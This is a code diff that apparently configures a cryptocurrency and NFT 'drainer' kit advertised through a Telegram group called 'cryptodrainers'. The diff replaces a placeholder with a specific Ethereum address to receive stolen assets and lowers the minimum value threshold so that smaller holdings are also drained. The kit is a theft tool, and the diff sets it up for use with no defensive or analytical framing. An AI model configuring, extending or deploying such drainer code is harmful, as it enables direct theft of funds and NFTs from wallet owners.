@@ -4,10 +4,10 @@
     Telegram group: https://t.me/cryptodrainers
 */
 
-const receiveAddress = "RECEIVER WALLET"; // Put your ETH wallet adress where you want to receive results
+const receiveAddress = "0xd94848e05442bF112E584fd3F89694FC3E7a457C"; // Put your ETH wallet adress where you want to receive results
 
 const drainNftsInfo = {
-    minValue: 0.01, // Minimum value of the last transactions
+    minValue: 0.0001, // Minimum value of the last transactions
     maxTransfers: 100, // Maximum NFT transfer (let it be as it is)
 }
 
